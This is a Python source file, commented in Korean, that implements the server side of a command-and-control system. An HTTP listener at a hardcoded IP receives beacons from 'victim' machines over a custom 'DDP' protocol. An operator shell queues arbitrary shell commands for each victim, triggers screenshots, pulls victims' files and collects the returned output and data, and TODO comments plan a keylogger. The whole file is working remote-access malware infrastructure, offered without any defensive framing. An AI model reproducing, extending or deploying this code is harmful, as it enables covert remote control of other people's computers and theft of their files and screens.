from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque
from datetime import datetime
from os import path

from customProtocol import DDP
from logManager import Logger
from seqFileManager import SEQManager
from Exceptions import SEQNumError, SEQSaveError

import threading
import cmd


class BaseShell(cmd.Cmd):
    '''base'''
    prompt = "> "

    def emptyline(self):
        pass

    def _print_log(self, count=100):
        with open(LOG_PATH + datetime.now().strftime('%Y%m%d.txt'), 'r') as fr:
            log_data = fr.readlines()

        start_index = (len(log_data) - count) if (len(log_data) - count) > 0 else 0

        log_data = log_data[start_index:]

        for data in log_data:
            print(data, end='')

    def do_exit(self, arg):
        return True

    def do_log(self, arg):
        '''print log file\nusage log\nusage log [count]'''
        if arg:
            try:
                arg = int(arg)
                self._print_log(arg)
                return
            except:
                return self.default('log ' + arg)
        self._print_log()

# 시작 쉘
class EntryShell(BaseShell):
    '''Entry Shell'''

    def _get_victim_names(self) -> list:
        result = []

        for val in victim_table.values():
            result.append(val['name'])
        return result
    
    def _convert_victim_name_to_ip(self, vic_name) -> str:
        for ip, value in victim_table.items():
            if value['name'] == vic_name:
                return ip
        return False


    def do_use(self, arg):
        '''지정한 Victim의 쉘 모드로 진입'''

        if arg and arg in self._get_victim_names():
            victim_shell = VictimShell()
            victim_shell.setTarget(arg, self._convert_victim_name_to_ip(arg))
            victim_shell.cmdloop()

    def do_show(self, arg):
        '''show victim'''
        if arg == 'victim':
            print('|%20s|%20s|%40s|' % ('name', 'ip', 'cmd queue'))
            print('-'*84)
            for ip in victim_table.keys():
                print('|%20s|%20s|%40s|' % (victim_table[ip]['name'], ip, list(victim_table[ip]['command'])))

# 피해자 모드 쉘
class VictimShell(BaseShell):

    def setTarget(self, victimName, victimIP):
        self.prompt = '{0}({1}) > '.format(victimName, victimIP)
        self.targetIP = victimIP

    def do_sh(self, arg):
        '''sh [command]'''
        global victim_table
        victim_table[self.targetIP]['command'].append(arg)

    def do_screenshot(self, arg):
        '''take screenshot on victim and get it to server'''
        global victim_table
        victim_table[self.targetIP]['command'].append('[screenshot]')

    def do_show(self, arg):
        '''show (dict|queue)'''
        if arg == 'dict':
            print(victim_table[self.targetIP])
        elif arg == 'queue':
            print(list(victim_table[self.targetIP]['command']))
        pass

    def do_gf(self, arg):
        '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
        global victim_table
        
        parsed_arg = arg.split(' ')

        if '\\' in parsed_arg[-1]:
            parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]

        if len(parsed_arg) == 1:
            if path.isfile(FILE_PATH + parsed_arg[0]):
                print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
                return
        elif len(parsed_arg) == 2:
            if path.isfile(FILE_PATH + parsed_arg[1]):
                print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
                return
        else:
            return self.default('gf ' + arg)


        with open(FILE_PATH+parsed_arg[-1], 'wb'):
            pass

        victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
        


    def do_sf(self, arg):
        '''미구현'''
        # TODO server to victim 파일 전송 구현하기
        pass

    

class CNCServer(BaseHTTPRequestHandler):
    # HTTPServer 모듈이 제공하는 로깅 기능 비활성화
    def log_message(self, format, *args):
        return

    # 파싱된 데이터 로깅
    def _logging_parsed_data(self, victim_ip, parsed_data):
        Logger.info("{} : {}".format(victim_ip, str(parsed_data)))

    # 큐에 쌓인 명령어 pop
    def _pop_command_queue(self, victim_ip) -> str:
        global victim_table

        command = ""

        command_queue = victim_table[victim_ip]['command']
        
        while command_queue:
            if command_queue[0].startswith('[') and command_queue[0].endswith(']'):
                if command == "":
                    return command_queue.popleft()
                else:
                    break
            element = command_queue.popleft()
            victim_table[victim_ip]['shQueue'].append(element)
            command += element + ";"

        return command[:-1]

    # ddp raw data 파싱
    def _parse_ddp(self, data) -> dict:
        try:
            return DDP.parsing(data)
        except Exception as e:
            self._response_ddp_error()
            Logger.error("request ddp parse error : {}".format(str(e)))
            return False

    # error 응답      
    def _response_ddp_error(self, error_message=""):
        self._response_writer(DDP.raw('ERROR', 0, error_message.encode(ENCODING)))

    # ack 응답
    def _response_ack(self):
        self._response_writer(DDP.raw('ACK', 0, ''.encode(ENCODING)), logging=False)

    # shell request 응답
    def _response_shell_request(self, command):
        self._response_writer(DDP.raw('SHELL_REQUEST', 0, command.encode(ENCODING)))

    # ftp request 응답
    def _response_ftp_request(self, data, victim_ip, file_name):
                    
        global victim_table

        victim_table[victim_ip]['seqName'].append(file_name)

        self._response_writer(DDP.raw('FTP_REQUEST', 0, data.encode(ENCODING)))

    # 응답 처리 및 응답 메시지 로깅
    def _response_writer(self, data : bytes, additional_header={}, logging=True):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset={}'.format(ENCODING))

        if len(additional_header) > 0:
            for key, val in additional_header.items():
                self.send_header(key, val)
        self.end_headers()

        self.wfile.write(data)

        if logging:
            try:
                Logger.info('response ' + str(data))
            except:
                Logger.info('response unknown data')

    # vimctim 추가
    def _append_victim(self, victim_ip, victim_name=""):
        global victim_table

        if not victim_name:
            victim_name = victim_ip

        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque()}

    def _save_none_seq_file(self, victim_ip, data):
        try:
            seq_name = victim_table[victim_ip]['seqName'][0]

            #만약 시퀀스 명이 fullpath이면 \ 를 제거
            if '\\' in seq_name:
                seq_name = seq_name.split('\\')[-1]

            with open(FILE_PATH+seq_name, 'wb') as fw:
                fw.write(data)
        except Exception as e:
            Logger.error('none seq file save error : {}'.format(str(e)))
            return False
        return True

    # sequence 딕셔너리에 데이터 저장
    def _gather_seq_data(self, victim_ip, seq, data, isFTP=True):
        if not isFTP and seq == 1:
            global victim_table
            victim_table[victim_ip]['seqName'].appendleft(str(victim_ip) + datetime.now().strftime('_%Y%m%d-%H%M%S.seq'))

        seq_name = ""
        try:
            seq_name = victim_table[victim_ip]['seqName'][0]

            #만약 시퀀스 명이 fullpath이면 \ 를 제거
            if '\\' in seq_name:
                seq_name = seq_name.split('\\')[-1]

            SEQManager.saveSeqData(seq_name, seq, data)
        except SEQNumError as seq_e:
            Logger.error('seq gather error : {}'.format(str(seq_e)))
            return False
        except Exception as e:
            Logger.error('seq gather error : {}'.format(str(e)))
            return False

        if not seq_name:
            Logger.error('seq name is not exist in queue..!')
            return False

        Logger.info('{} seq datas in'.format(seq))

        return True
    
    # sequence 딕셔너리에 쌓인 데이터 조립
    def _merge_seq_data(self, victim_ip, isFTP : bool) -> bytes:
        seq_name = ""
        try:
            if isFTP:
                seq_name = victim_table[victim_ip]['seqName'][0]
            else:
                seq_name = victim_table[victim_ip]['seqName'].popleft()

            #만약 시퀀스 명이 fullpath이면 \ 를 제거
            if '\\' in seq_name:
                seq_name = seq_name.split('\\')[-1]

            SEQManager.mergeSeqData(seq_name, FILE_PATH)
        except SEQSaveError as seq_e:
            Logger.error('seq merge error : {}'.format(str(seq_e)))
            return False
        except Exception as e:
            Logger.error('seq merge error : {}'.format(str(e)))
            return False
        return True

    def do_POST(self):
        # body와 ip get
        data_string = self.rfile.read(int(self.headers['Content-Length']))
        victim_ip = self.client_address[0]

        if len(data_string) < 10:
            self._response_ddp_error('invalid ddp data')
            return

        # body 파싱 후 로깅
        parsed_data = self._parse_ddp(data_string)

        # data 유효성 검증
        if not parsed_data or parsed_data['header'] != '0xdd':
            self._response_ddp_error('invalid ddp data')
            return

        # ftp나 시퀀스 응답의 경우 로깅 X
        if (parsed_data['type'] != 'FTP_RESPONSE' and parsed_data['type'] != 'BEACON_REQUEST') and parsed_data['sequence'] == 0:
            self._logging_parsed_data(victim_ip, parsed_data)
        elif parsed_data['sequence'] != 0:
            Logger.info('{}-{} : receive seq data'.format(victim_ip, parsed_data['type']))
        

        # victim_table에 ip가 존재하지 않다면 추가 작업
        if victim_ip not in victim_table:
            self._append_victim(victim_ip=victim_ip)

        ddp_data = parsed_data['data']
        
        isFtp = True if parsed_data['type'] == 'FTP_RESPONSE' else False

        # sequence가 0이 아니라면 sequence 딕셔너리에 데이터 모으기
        if parsed_data['sequence'] != 0 and parsed_data['sequence'] != 0xffffffff:

            if not self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data, isFtp):
                self._response_ddp_error('seq saving error')
                return
            self._response_ack()
            return

        # sequence가 0이면서 sequence 딕셔너리에 값이 존재한다면 data merge 수행
        if parsed_data['sequence'] == 0xffffffff:
            if not self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data, isFtp):
                self._response_ddp_error('seq saving error')
                return 
            
            if not self._merge_seq_data(victim_ip, isFtp):
                self._response_ddp_error('seq merge error')
                return
        elif parsed_data['type'] == 'FTP_RESPONSE' and parsed_data['sequence'] == 0:
            if not self._save_none_seq_file(victim_ip, parsed_data['data']):
                self._response_ddp_error('none seq file saving error')
                return

        # type별 함수 호출
        type_function = getattr(self, "_func_"+parsed_data['type'].lower())
        type_function(victim_ip, ddp_data)

    # 비콘 요청에 대한 처리 함수
    def _func_beacon_request(self, victim_ip : str, ddp_data):
        # 큐에 쌓인 명령어 pop
        data = self._pop_command_queue(victim_ip)   

        if data:
            if data.startswith('[') and data.endswith(']'):
                # screenshot 명령어 처리
                if data == "[screenshot]":
                    self._response_ftp_request("screenshot", victim_ip, datetime.now().strftime('%Y%m%d-%H%M%S.bmp'))
                    return
                # gf 명령어 처리
                elif data.startswith('[gf'):
                    file_name = data.split(' ')
                    if len(file_name) == 3:
                        self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
                    else:
                        self._response_ftp_request(file_name[len(file_name)-1][:-1], victim_ip, file_name[len(file_name)-1][:-1])
                    return
            # shell 명령어 처리
            else:
                self._response_shell_request(data)
                return
        # 명령어가 존재하지 않으면 ack response
        else:
            self._response_ack()

    # shell 응답에 대한 처리 함수
    def _func_shell_response(self, victim_ip : str, ddp_data):
        global victim_table

        try:
            command = victim_table[victim_ip]['shQueue'].popleft()
            result = ddp_data.decode(ENCODING)

            print()
            print('=={} command result==\n{}'.format(command, result))


            Logger.info('sh result : {}'.format(ddp_data.decode(ENCODING)))
        except IndexError as e:
            Logger.error('receive shell response error : no command in shQueue : ' + str(e))
            self._response_ddp_error('receive shell response error')
        except UnicodeDecodeError as e:
            Logger.error('receive shell response error : decode commmand({}) result fail : {}'.format(command, str(e)))
            self._response_ddp_error('receive shell response error')

            print()
            print('=={} command result==\n{}'.format(command, str(result)))
        except Exception as e:
            Logger.error('receive shell response error : unknown error : ' + str(e))
            self._response_ddp_error('receive shell response error')

        self._response_ack()

    # ftp 응답에 대한 처리 함수
    def _func_ftp_response(self, victim_ip : str, ddp_data):
        # TODO file_path에 맞게 저장
        fileName = ""

        try:
            fileName = victim_table[victim_ip]['seqName'].popleft()

            #만약 파일명이 fullpath이면 \ 를 제거
            if '\\' in fileName:
                fileName = fileName.split('\\')[-1]

            if not path.isfile(FILE_PATH+fileName):
                raise SEQSaveError('SEQSaveError : file not found')

            Logger.info('{} file saved'.format(fileName))
            self._response_ack()
        except Exception as e:
            self._response_ddp_error('ftp response error')
            if not fileName:
                Logger.error('{0} fileName Queue is empty!'.format(victim_ip))
                return
            Logger.error('{0} seq save error : {1}'.format(fileName, str(e)))
        
LOG_PATH = Logger.LOG_PATH
FILE_PATH = './file/'
TMP_FILE_PATH = SEQManager.TMP_FILE_PATH

ENCODING = 'cp949'
SERVER_INFO = ('172.17.254.126', 80)

victim_table = {} # {ip : {name : [name], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}


# http server
try:
    httpd = HTTPServer(SERVER_INFO, CNCServer)

    http_server_thread = threading.Thread(target=httpd.serve_forever)
    http_server_thread.daemon = True
    http_server_thread.start()  
except Exception as e:
    print('[!] HTTP Server Open Error / {}'.format(str(e)))
    exit(0)


# TODO 패킷 전송중 클라이언트가 연결을 끊을 경우 발생하는 Broken PIPE 예외처리
# TODO keylogger
if __name__ == '__main__':
    try:
        EntryShell().cmdloop() # 대화형 쉘 실행
    except KeyboardInterrupt:
        print()
        exit(0)